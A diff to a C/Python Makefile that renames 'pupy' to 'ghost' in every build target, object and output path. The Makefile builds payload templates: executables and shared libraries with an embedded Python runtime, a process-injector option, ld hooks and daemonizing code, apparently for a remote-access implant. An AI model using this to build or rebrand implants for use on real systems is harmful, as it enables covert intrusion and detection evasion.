@@ -101,11 +101,11 @@ CFLAGS += -DDEBUG_USE_OS_PYTHON
 endif
 
 PYTHON ?= python3
-TEMPLATE_OUTPUT_PATH ?= ../../pupy/payload_templates/
+TEMPLATE_OUTPUT_PATH ?= ../../ghost/payload_templates/
 
-SHARED_OBJS := main_so.o tmplibrary_lmid.o pupy_load.o
-SHARED_CFLAGS := -D_PUPY_SO
-APP_OBJS := main_exe.o tmplibrary.o pupy_load.o
+SHARED_OBJS := main_so.o tmplibrary_lmid.o ghost_load.o
+SHARED_CFLAGS := -D_GHOST_SO
+APP_OBJS := main_exe.o tmplibrary.o ghost_load.o
 COMMON_OBJS := daemonize.o decompress.o
 LOAD_DEPS := \
 	resources/$(MACH)/libssl.c \
@@ -154,8 +154,8 @@ CFLAGS += -D_FEATURE_INJECTOR -Iinjector/include
 LDFLAGS += -Wl,-wrap,realpath
 endif
 
-PUPY_LOAD_DEPS := \
-	pupy_load.c \
+GHOST_LOAD_DEPS := \
+	ghost_load.c \
 	resources/$(MACH)/library.c \
 	resources/$(MACH)/python3x.c \
 	resources/$(MACH)/libssl.c \
@@ -163,7 +163,7 @@ PUPY_LOAD_DEPS := \
 	resources/$(MACH)/libffi.c \
 	import-tab.c revision.h
 
-all: $(TEMPLATE_OUTPUT_PATH)/pupy$(NAME)-$(SUFFIX) $(TEMPLATE_OUTPUT_PATH)/pupy$(NAME)-$(SUFFIX).so $(TEMPLATE_OUTPUT_PATH)/_pupy$(SUFFIX).so
+all: $(TEMPLATE_OUTPUT_PATH)/ghost$(NAME)-$(SUFFIX) $(TEMPLATE_OUTPUT_PATH)/ghost$(NAME)-$(SUFFIX).so $(TEMPLATE_OUTPUT_PATH)/_ghost$(SUFFIX).so
 
 revision.h:
 	if [ x"$$COMMIT" = x"" ]; then rev=`cat ../../.git/\`cat ../../.git/HEAD | cut -f 2 -d \ \` | cut -c 1-8`; \
@@ -172,11 +172,11 @@ revision.h:
 debug.o: ../common/debug.c ../common/debug.h
 	$(CC) -c -o $@ $< $(CFLAGS)
 
-resources/$(MACH)/_pupy.so: build_c_ext.py revision.h pupy.c daemonize.c tmplibrary.c decompress.c ld_hooks.c
+resources/$(MACH)/_ghost.so: build_c_ext.py revision.h ghost.c daemonize.c tmplibrary.c decompress.c ld_hooks.c
 	$(PYTHON) build_c_ext.py build $(CEXTFLAGS)
-	cp -f $(shell echo build/lib.linux-*/_pupy.*) resources/$(MACH)/_pupy.so
+	cp -f $(shell echo build/lib.linux-*/_ghost.*) resources/$(MACH)/_ghost.so
 
-# pupy.o: revision.h ../common/jni_on_load.c ../common/Python-dynload.h import-tab.h $(PUPY_LOAD_DEPS) resources/$(MACH)/python3x.c 
+# ghost.o: revision.h ../common/jni_on_load.c ../common/Python-dynload.h import-tab.h $(GHOST_LOAD_DEPS) resources/$(MACH)/python3x.c 
 #	$(CC) -c $(LIBPYTHON_INC) -o $@ $(CFLAGS) $(SHARED_CFLAGS) $<
 
 main_so.o: main_so.c import-tab.h 
@@ -185,7 +185,7 @@ main_so.o: main_so.c import-tab.h
 main_exe.o:	main_exe.c import-tab.h 
 	$(CC) $(CFLAGS) -c -o $@ $< 
 
-pupy_load.o: pupy_load.c $(LOAD_DEPS) resources/$(MACH)/_pupy.c import-tab.h Python-dynload-os.h
+ghost_load.o: ghost_load.c $(LOAD_DEPS) resources/$(MACH)/_ghost.c import-tab.h Python-dynload-os.h
 	$(CC) -c -o $@ $< $(CFLAGS)
 
 tmplibrary.o: tmplibrary.c
@@ -255,7 +255,7 @@ resources/$(MACH)/libffi.so: $(LIBFFI)
 resources/$(MACH)/library.zip: ../build_library_zip.py ../additional_imports.py
 	$(PYTHON) -OO $(PFLAGS) $< $@
 
-resources/$(MACH)/_pupy.c: ../gen_resource_header.py resources/$(MACH)/_pupy.so
+resources/$(MACH)/_ghost.c: ../gen_resource_header.py resources/$(MACH)/_ghost.so
 	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)
 
 resources/$(MACH)/python3x.c: ../gen_resource_header.py resources/$(MACH)/python$(PYMAJ)$(PYMIN).so
@@ -270,32 +270,32 @@ resources/$(MACH)/libcrypto.c: ../gen_resource_header.py resources/$(MACH)/libcr
 resources/$(MACH)/libffi.c: ../gen_resource_header.py resources/$(MACH)/libffi.so
 	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)
 
-$(TEMPLATE_OUTPUT_PATH)/pupy$(NAME)-$(SUFFIX): $(APP_OBJS) $(COMMON_OBJS)
+$(TEMPLATE_OUTPUT_PATH)/ghost$(NAME)-$(SUFFIX): $(APP_OBJS) $(COMMON_OBJS)
 	$(CC) $(PIE) $+ -o $@ $(LDFLAGS) \
-		-Wl,--version-script=pupy.ldscript \
+		-Wl,--version-script=ghost.ldscript \
 		-Wl,--export-dynamic
 
-$(TEMPLATE_OUTPUT_PATH)/pupy$(NAME)-$(SUFFIX).so: $(SHARED_OBJS) $(COMMON_OBJS)
-	$(CC) -shared $+ -o $@ $(LDFLAGS) -Wl,-soname,pupy$(NAME)-$(SUFFIX).so \
-		-Wl,--version-script=pupy.so.ldscript
+$(TEMPLATE_OUTPUT_PATH)/ghost$(NAME)-$(SUFFIX).so: $(SHARED_OBJS) $(COMMON_OBJS)
+	$(CC) -shared $+ -o $@ $(LDFLAGS) -Wl,-soname,ghost$(NAME)-$(SUFFIX).so \
+		-Wl,--version-script=ghost.so.ldscript
 
-$(TEMPLATE_OUTPUT_PATH)/_pupy$(SUFFIX).so: resources/$(MACH)/_pupy.so
-	cp resources/$(MACH)/_pupy.so $(TEMPLATE_OUTPUT_PATH)/_pupy$(SUFFIX).so
+$(TEMPLATE_OUTPUT_PATH)/_ghost$(SUFFIX).so: resources/$(MACH)/_ghost.so
+	cp resources/$(MACH)/_ghost.so $(TEMPLATE_OUTPUT_PATH)/_ghost$(SUFFIX).so
 
 .PHONY: clean all
 
 clean:
 	rm -f $(COMMON_OBJS) $(PYOBJS)
-	rm -f pupy pupy.so
+	rm -f ghost ghost.so
 	rm -f *.o
-	rm -f resources/$(MACH)/_pupy.so
-	rm -f resources/$(MACH)/_pupy.c
+	rm -f resources/$(MACH)/_ghost.so
+	rm -f resources/$(MACH)/_ghost.c
 	rm -rf build
 
 distclean: clean
 	rm -f resources/*.c
 	rm -f resources/$(MACH)/*.c
-	rm -f resources/$(MACH)/_pupy.so
+	rm -f resources/$(MACH)/_ghost.so
 	rm -f ld_hooks_$(NAME).c
 	rm -f ld_hooks_$(NAME).so
 	rm -f import-tab.c
